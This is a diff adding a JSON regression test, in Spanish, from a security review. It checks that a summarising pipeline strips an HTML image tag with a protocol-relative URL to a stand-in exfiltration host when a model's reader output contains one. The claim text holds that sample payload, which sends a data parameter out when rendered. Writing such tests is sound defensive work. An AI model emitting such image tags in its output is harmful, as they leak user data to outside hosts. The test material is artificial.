@@ -1,0 +1,27 @@
+{
+  "id": "lector-html-img",
+  "category": "seguridad",
+  "description": "Regresión (revisión de seguridad): una etiqueta <img> con URL relativa al protocolo es un canal de exfiltración.",
+  "llm": {
+    "reader": [
+      {
+        "claims": [
+          {
+            "text": "Estado <img src=//exfil.ejemplo.invalid/p?d=x>",
+            "cites": [
+              "mail:1c5bf8e4"
+            ]
+          }
+        ]
+      }
+    ]
+  },
+  "expect": {
+    "attempts": {
+      "reader": 2
+    },
+    "digest_not_contains": [
+      "exfil.ejemplo.invalid"
+    ]
+  }
+}
